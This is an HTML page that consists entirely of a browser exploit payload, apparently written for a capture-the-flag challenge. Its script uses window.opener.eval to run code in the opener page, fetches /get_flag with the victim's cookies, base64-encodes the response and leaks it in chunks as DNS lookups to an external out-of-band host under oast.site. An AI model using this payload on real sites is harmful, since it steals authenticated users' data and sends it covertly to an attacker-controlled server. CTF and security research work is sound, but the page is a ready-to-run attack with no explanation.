<!DOCTYPE html>
<html><body>
<script>
if (window.opener) {
  window.opener.eval(`
    (function(){
      // 1) synchronously grab the flag (cookie is sent automatically)
      var xhr = new XMLHttpRequest();
      xhr.open('GET','/get_flag',false);
      xhr.send(null);
      if (xhr.status !== 200) return;

      // 2) base64‐encode & strip padding
      var base64 = btoa(xhr.responseText).replace(/=/g,'');

      // 3) split into ≤63-char labels
      var labels = [];
      for (var i = 0; i < base64.length; i += 63) {
        labels.push(base64.slice(i, i + 63));
      }

      // 4) fire off each as a DNS lookup immediately
      for (var j = 0; j < labels.length; j++) {
        var img = new Image();
        img.src = 'http://' + labels[j] + '.' + j +
                  '.bkdxspdaaz5k3bcjumvu0si0h1d7zctqj.oast.site/';
      }
    })();
  `);
}
</script>
</body></html>
